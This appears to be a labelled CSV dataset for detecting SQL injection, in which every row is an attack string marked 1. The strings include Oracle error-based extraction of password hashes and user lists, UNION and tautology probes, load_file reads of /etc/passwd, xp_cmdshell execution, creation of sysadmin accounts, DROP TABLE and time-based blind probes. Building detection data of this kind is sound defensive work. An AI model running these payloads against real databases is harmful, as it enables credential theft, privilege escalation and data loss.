,Sentence,Label
52,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 1  )  )   AND 'i' = 'i",1
53,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 2  )  )   AND 'i' = 'i",1
54,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 2  )  )   AND 'i' = 'i",1
55,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 2  )  )   AND 'i' = 'i",1
56,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 2  )  )   AND 'i' = 'i",1
57,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 2  )  )   AND 'i' = 'i",1
58,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 3  )  )   AND 'i' = 'i",1
59,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 3  )  )   AND 'i' = 'i",1
60,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 3  )  )   AND 'i' = 'i",1
61,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 3  )  )   AND 'i' = 'i",1
62,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 3  )  )   AND 'i' = 'i",1
63,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 4  )  )   AND 'i' = 'i",1
64,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 4  )  )   AND 'i' = 'i",1
65,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 4  )  )   AND 'i' = 'i",1
66,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 4  )  )   AND 'i' = 'i",1
67,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 4  )  )   AND 'i' = 'i",1
68,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 5  )  )   AND 'i' = 'i",1
69,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 5  )  )   AND 'i' = 'i",1
70,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 5  )  )   AND 'i' = 'i",1
71,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 5  )  )   AND 'i' = 'i",1
72,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 5  )  )   AND 'i' = 'i",1
73,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 6  )  )   AND 'i' = 'i",1
74,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 6  )  )   AND 'i' = 'i",1
75,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 6  )  )   AND 'i' = 'i",1
76,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 6  )  )   AND 'i' = 'i",1
77,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 6  )  )   AND 'i' = 'i",1
78,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 7  )  )   AND 'i' = 'i",1
79,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 7  )  )   AND 'i' = 'i",1
80,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 7  )  )   AND 'i' = 'i",1
81,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 7  )  )   AND 'i' = 'i",1
82,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 7  )  )   AND 'i' = 'i",1
83,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 8  )  )   AND 'i' = 'i",1
84,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 8  )  )   AND 'i' = 'i",1
85,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 8  )  )   AND 'i' = 'i",1
86,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 8  )  )   AND 'i' = 'i",1
87,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 8  )  )   AND 'i' = 'i",1
88,"'|| ( elt ( -3+5,bin ( 15 ) ,ord ( 10 ) ,hex ( char ( 45  )  )    )  )  ",1
89,||6,1
90,'||'6,1
91, ( ||6 ) ,1
92,' or 1 = 1-- ,1
93,or 1 = 1,1
94,' or '1' = '1,1
95,; or '1' = '1',1
96,""" or isNULL ( 1/0 )  /*",1
97,' or '7659' = '7659,1
98,""" or isNULL ( 1/0 )  /*",1
99,' -- ,1
100,' or 1 = 1--,1
101,""" or 1 = 1--",1
102,' or 1 = 1 /*,1
103,or 1 = 1--,1
104,' or 'a' = 'a,1
105,""" or ""a"" = ""a",1
106,' )  or  ( 'a' = 'a,1
107,admin' or ',1
108,' select * from information_schema.tables--,1
109, )  union select * from information_schema.tables;,1
110,' having 1 = 1--,1
111,' having 1 = 1--,1
112,' group by userid having 1 = 1--,1
113,' select name from syscolumns where id  =   ( select id from sysobjects where name  =  tablename' ) --,1
114,' or 1 in  ( select @@version ) --,1
115,' union all select @@version--,1
116,' or 'unusual'  =  'unusual',1
117,' or 'something'  =  'some'+'thing',1
118,' or 'text'  =  n'text',1
119,' or 'something' like 'some%',1
120,' or 2 > 1,1
121,' or 'text' > 't',1
122,' or 'whatever' in  ( 'whatever' ) ,1
123,' or 2 between 1 and 3,1
124,' or username like char ( 37 ) ;,1
125,"' union select * from users where login  =  char ( 114,111,111,116 ) ;",1
126,' union select ,1
127,password:*/ = 1--,1
128,uni/**/on sel/**/ect,1
129,'; execute immediate 'sel' || 'ect us' || 'er',1
130,'; exec  ( 'sel' + 'ect us' + 'er' ) ,1
131,'/**/or/**/1/**/ = /**/1,1
132,' or 1/*,1
133, or isNULL ( 1/0 )  /*,1
134,' or '7659' = '7659,1
135,""" or isNULL ( 1/0 )  /*",1
136,' -- &password = ,1
137,'; begin declare @var varchar ( 8000 )  set @var = ':' select @var = @var+'+login+'/'+password+' ' from users where login > ,1
138,@var select @var as var into temp end --,1
139,' and 1 in  ( select var from temp ) --,1
140,"' union select 1,load_file ( '/etc/passwd' ) ,1,1,1;",1
141,"1; ( load_file ( char ( 47,101,116,99,47,112,97,115,115,119,100  )  )   ) ,1,1,1;",1
142,"' and 1 =  (  if  (  (  load_file ( char ( 110,46,101,120,116  )  )  <>char ( 39,39  )  )  ,1,0  )  )  ;",1
143,'; exec master..xp_cmdshell 'ping 10.10.1.2'--,1
144,create user name identified by 'pass123',1
145,create user name identified by pass123 temporary tablespace temp default tablespace users; ,1
146,' ; drop table temp --,1
147,"exec sp_addlogin 'name' , 'password'",1
148,"exec sp_addsrvrolemember 'name' , 'sysadmin'",1
149,"insert into mysql.user  ( user, host, password )  values  ( 'name', 'localhost', password ( 'pass123'  )  )  ",1
150,grant connect to name; grant resource to name;,1
151,"insert into users ( login, password, level )  values (  char ( 0x70 )  + char ( 0x65 )  + char ( 0x74 )  + char ( 0x65 )  + char ( 0x72 )  + char ( 0x70 )  + char ( 0x65 )  + char ( 0x74 )  + char ( 0x65 )  + char ( 0x72 ) ,char ( 0x64 ) ",1
152,' or 1 = 1 --,1
153,' union  ( select @@version )  --,1
154,"' union  ( select NULL,  ( select @@version  )  )   --",1
155,"' union  ( select NULL, NULL,  ( select @@version  )  )   --",1
156,"' union  ( select NULL, NULL, NULL,   ( select @@version  )  )   --",1
157,"' union  ( select NULL, NULL, NULL, NULL,   ( select @@version  )  )   --",1
158,"' union  ( select NULL, NULL, NULL, NULL,  NULL,  ( select @@version  )  )   --",1
159,"'; if not ( substring  (  (  select @@version ) ,25,1 )  <> 0 )  waitfor delay '0:0:2' --",1
160,"'; if not ( substring  (  (  select @@version ) ,25,1 )  <> 5 )  waitfor delay '0:0:2' --",1
161,"'; if not ( substring  (  (  select @@version ) ,25,1 )  <> 8 )  waitfor delay '0:0:2' --",1
162,"'; if not ( substring  (  (  select @@version ) ,24,1 )  <> 1 )  waitfor delay '0:0:2' --",1
163,'; if not ( select system_user )  <> 'sa' waitfor delay '0:0:2' --,1
164,'; if is_srvrolemember ( 'sysadmin' )  > 0 waitfor delay '0:0:2' -- ,1
165,'; if not  (  (  select serverproperty ( 'isintegratedsecurityonly'  )  )   <> 1 )  waitfor delay '0:0:2' --,1
166,'; if not  (  (  select serverproperty ( 'isintegratedsecurityonly'  )  )   <> 0 )  waitfor delay '0:0:2' --,1
167," select * from users where id = 1 or  ( \ )  = 1 union select 1,@@VERSION -- 1",1
168," select * from users where id = 1 or  ( \. )  = 1 union select 1,@@VERSION -- 1",1
169, select * from users where id = 1 or  ( \+ )  = 1 or 1 = 1 -- 1,1
170," select * from users where id = 1 or  ( 1 )  = 1 union select 1,banner from v$version where rownum = 1 -- 1",1
171," select * from users where id = 1 or  ( \+ )  = 1 union select 1,@@VERSION -- 1",1
172, select * from users where id = 1 or  ( $+ )  = 1 or 1 = 1 -- 1,1
173," select * from users where id = 1 or  ( $+ )  = 1 union select 1,@@VERSION -- 1",1
174, select * from users where id = 1 or \.<\ or 1 = 1 -- 1,1
175, select * from users where id = 1 or \.<1 or 1 = 1 -- 1,1
176," select * from users where id = 1 or \.<1 union select 1,@@VERSION -- 1",1
177," select * from users where id = 1 or \.<\ union select 1,@@VERSION -- 1",1
178, select * from users where id = 1 or \.<$ or 1 = 1 -- 1,1
179," select * from users where id = 1 or \.<$ union select 1,@@VERSION -- 1",1
180," select * from users where id = 1 or \.<  = 1 union select 1,@@VERSION -- 1",1
181," select * from users where id = 1 ||1 union select 1,banner from v$version where rownum = 1 -- 1",1
182," select * from users where id = 1 ||1 union select null,banner from v$version where rownum = 1 -- 1",1
183, select * from users where id = 1   or 1 = 1 -- 1,1
184, select * from users where id = 1 or \+<\ or 1 = 1 -- 1,1
185," select * from users where id = 1 or  1<@ = 1 union select 1,version (  )  -- 1",1
186," select * from users where id = 1 or \+<\ union select 1,@@VERSION -- 1",1
187," select * from users where id = 1 or \+<$ union select 1,@@VERSION -- 1",1
188," select * from users where id = 1 or 1&@# = 1 union select 1,version (  )  -- 1",1
189," select * from users where id = 1 or $ . = 1 union select 1,@@VERSION -- 1",1
190, select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1,1
191," select * from users where id = 1 or $ 1 = 1 union select 1,@@VERSION -- 1",1
192, select * from users where id = 1 or $<\ or 1 = 1 -- 1,1
193, select * from users where id = 1 or $<\. or 1 = 1 -- 1,1
194," select * from users where id = 1 or $<\. union select 1,@@VERSION -- 1",1
195," select * from users where id = 1 or $<\ union select 1,@@VERSION -- 1",1
196, select * from users where id = 1 or $+<\ or 1 = 1 -- 1,1
197," select * from users where id = 1 or $+<1 union select 1,@@VERSION -- 1",1
198," select * from users where id = 1 or $+<\ union select 1,@@VERSION -- 1",1
199," select * from users where id = 1 or $+<$ union select 1,@@VERSION -- 1",1
200, select * from users where id = 1 or \<\. or 1 = 1 -- 1,1
201," select * from users where id = 1 or \<\. union select 1,@@VERSION -- 1",1
202, select * from users where id = 1 or \<1 or 1 = 1 -- 1,1
203," select * from users where id = 1 or \<1 union select 1,@@VERSION -- 1",1
204," select * from users where id = 1 or \<\ union select 1,@@VERSION -- 1",1
205," select * from users where id = 1 or \<\ union select null,@@VERSION -- 1",1
206, select * from users where id = 1 or \<$ or 1 = 1 -- 1,1
207," select * from users where id = 1 or \<$ union select 1,@@VERSION -- 1",1
208, select * from users where id = 1 or \<  = 1 or 1 = 1 -- 1,1
209," select * from users where id = 1 or \<  = 1 union select 1,@@VERSION -- 1",1
210, select * from users where id = 1 or !<@ or 1 = 1 -- 1,1
211," select * from users where id = 1 or !<@ union select 1,version (  )  -- 1",1
212," select * from users where id = 1 or @`\` union select 1,version (  )  -- 1",1
213," select * from users where id = 1 or  @$# = 1 union select 1,version (  )  -- 1",1
214," select * from users where id = 1 or @<@ = 1 union select 1,version (  )  -- 1",1
215, select * from users where id = 1 + ( \ )  or 1 = 1 -- 1,1
216," select * from users where id = 1 + ( \ )  union select null,@@VERSION -- 1",1
217," select * from users where id = 1.&&1 union select 1,version (  )  -- 1",1
218, select * from users where id = 1. or 1 = 1 -- 1,1
219," select * from users where id = 1.&&@ union select 1,version (  )  -- 1",1
220, select * from users where id = 1 +  ( \. )  or 1 = 1 -- 1,1
221," select * from users where id = 1 +  ( \. )  union select null,@@VERSION -- 1",1
222," select * from users where id = 1.  union select 1,version (  )  -- 1",1
223," select * from users where id = 1. union select 1,banner from v$version where rownum = 1 -- 1",1
224," select * from users where id = 1.  union select version (  ) ,version (  )  -- 1",1
225," select * from users where id = 1. union select null,version (  )  -- 1",1
226," select * from users where id = 1 +\. union select null,@@VERSION -- 1",1
227," select * from users where id = 1. union select null,banner from v$version where rownum = 1 -- 1",1
228, select * from users where id = 1. <@ or 1 = 1 -- 1,1
229, select * from users where id = 1.<@. or 1 = 1 -- 1,1
230," select * from users where id = 1.<@. union select 1,version (  )  -- 1",1
231, select * from users where id = 1.*1 or 1 = 1 -- 1,1
232," select * from users where id = 1.*1 union select 1,banner from v$version where rownum = 1 -- 1",1
233," select * from users where id = 1.<1# union select 1,version (  )  -- 1",1
234," select * from users where id = 1. <@ union select 1,version (  )  -- 1",1
235," select * from users where id = 1. <@ union select version (  ) ,version (  )  -- 1",1
236," select * from users where id = 1.*\ union select null,@@VERSION -- 1",1
237, select * from users where id = 1.<@$ or 1 = 1 -- 1,1
238," select * from users where id = 1.<@$ union select 1,version (  )  -- 1",1
239, select * from users where id = 1.%@ or 1 = 1 -- 1,1
240," select * from users where id = 1.%@ union select 1,version (  )  -- 1",1
241," select * from users where id = 11||1 union select 1,banner from v$version where rownum = 1 -- 1",1
242, select * from users where id = 1 +1 or 1 = 1 -- 1,1
243, select * from users where id = 1 + ( 1 )  or 1 = 1 -- 1,1
244," select * from users where id = 1 + ( 1 )  union select 1,banner from v$version where rownum = 1 -- 1",1
245," select * from users where id = 1 + ( 1 )  union select null,banner from v$version where rownum = 1 -- 1",1
246," select * from users where id = 1 +1 union select 1,banner from v$version where rownum = 1 -- 1",1
247," select * from users where id = 1 +1 union select null,banner from v$version where rownum = 1 -- 1",1
248," select * from users where id = 11<1# union select 1,version (  )  -- 1",1
249, select * from users where id = 1 +  ( \+ )  or 1 = 1 -- 1,1
250," select * from users where id = 1 +  ( \+ )  union select null,@@VERSION -- 1",1
251," select * from users where id = 1 +\+. union select null,@@VERSION -- 1",1
252," select * from users where id = 1 -1<@ union select 1,version (  )  -- 1",1
253," select * from users where id = 1 +1<@ union select version (  ) ,version (  )  -- 1",1
254," select * from users where id = 1 +1<@ union select null,version (  )  -- 1",1
255, select * from users where id = 1 + \+%\ or 1 = 1 -- 1,1
256, select * from users where id = 1 + \+%1 or 1 = 1 -- 1,1
257," select * from users where id = 1 + \+%1 union select null,@@VERSION -- 1",1
258," select * from users where id = 1 + \+*\ union select null,@@VERSION -- 1",1
259, select * from users where id = 1 + \+%$ or 1 = 1 -- 1,1
260," select * from users where id = 1 + \+*$ union select null,@@VERSION -- 1",1
261," select * from users where id = 1 union select  ( 1 ) ,banner from v$version where rownum = 1 -- 1",1
262," select * from users where id = 1 union select 1||1,version (  )  -- 1",1
263," select * from users where id = 1 union select 1||@,version (  )  -- 1",1
264," select * from users where id = 1 union select 1 1$,version (  )  -- 1",1
265," select * from users where id = 1 union select 1 $,version (  )  -- 1",1
266," select * from users where id = 1 union select 1 1a,version (  )  -- 1",1
267," select * from users where id = 1 union select 1<@$,version (  )  -- 1",1
268," select * from users where id = 1 union select 1,banner from v$version where rownum = 1 -- 1",1
269," select * from users where id = 1 union select .1_,version (  )  -- 1",1
270," select * from users where id = 1 union select 1`\`,version (  )  -- 1",1
271," select * from users where id = 1 union select 1a#,banner from v$version where rownum = 1 -- 1",1
272," select * from users where id = 1 union select 1a,banner from v$version where rownum = 1 -- 1",1
273," select * from users where id = 1 union select .1$_,version (  )  -- 1",1
274," select * from users where id = 1 union select 1<@,version (  )  -- 1",1
275," select * from users where id = 1 union select 1<@.,version (  )  -- 1",1
276," select * from users where id = 1 union select 1 $$,version (  )  -- 1",1
277," select * from users where id = 1 union select !<1,version (  )  -- 1",1
278," select * from users where id = 1 union select +!<1,version (  )  -- 1",1
279," select * from users where id = 1 union select +!<@,version (  )  -- 1",1
280," select * from users where id = 1 union select !<@,version (  )  -- 1",1
281," select * from users where id = 1 union select @||1,version (  )  -- 1",1
282," select * from users where id = 1 union select @&&@,version (  )  -- 1",1
283," select * from users where id = 1 union select @ 1$,version (  )  -- 1",1
284," select * from users where id = 1 union select  @ $,version (  )  -- 1",1
285," select * from users where id = 1 union select @ 1a,version (  )  -- 1",1
286," select * from users where id = 1 union select @<@$,version (  )  -- 1",1
287," select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1",1
288," select * from users where id = 1 union select @ _,version (  )  -- 1",1
289," select * from users where id = 1 union select @ $_,version (  )  -- 1",1
290," select * from users where id = 1 union select @<@,version (  )  -- 1",1
291," select * from users where id = 1 union select @<@.,version (  )  -- 1",1
292," select * from users where id = 1 union select @ $$,version (  )  -- 1",1
293, select * from users where id = 1 +$ . or 1 = 1 -- 1,1
294," select * from users where id = 1 +$ . union select null,@@VERSION -- 1",1
295, select * from users where id = 1 +$ 1 or 1 = 1 -- 1,1
296," select * from users where id = 1 +$ 1 union select null,@@VERSION -- 1",1
297, select * from users where id = 1 +$+ or 1 = 1 -- 1,1
298, select * from users where id = 1 +  ( $+ )  or 1 = 1 -- 1,1
299," select * from users where id = 1 +  ( $+ )  union select null,@@VERSION -- 1",1
300, select * from users where id = 1 +$+. or 1 = 1 -- 1,1
301," select * from users where id = 1 +$+. union select null,@@VERSION -- 1",1
302," select * from users where id = 1 +$+ union select null,@@VERSION -- 1",1
303, select * from users where id = 1 + $+%\ or 1 = 1 -- 1,1
304, select * from users where id = 1 + $+%1 or 1 = 1 -- 1,1
305," select * from users where id = 1 + $+%1 union select null,@@VERSION -- 1",1
306," select * from users where id = 1 + $+*\ union select null,@@VERSION -- 1",1
307, select * from users where id = 1 + $+%$ or 1 = 1 -- 1,1
308," select * from users where id = 1 + $+*$ union select null,@@VERSION -- 1",1
309, select * from users where id = 1 <@ or 1 = 1 -- 1,1
310, select * from users where id = 1 % ( \ )  or 1 = 1 -- 1,1
311," select * from users where id = 1 * ( \ )  union select null,@@VERSION -- 1",1
312, select * from users where id = 1 % ( 1 )  or 1 = 1 -- 1,1
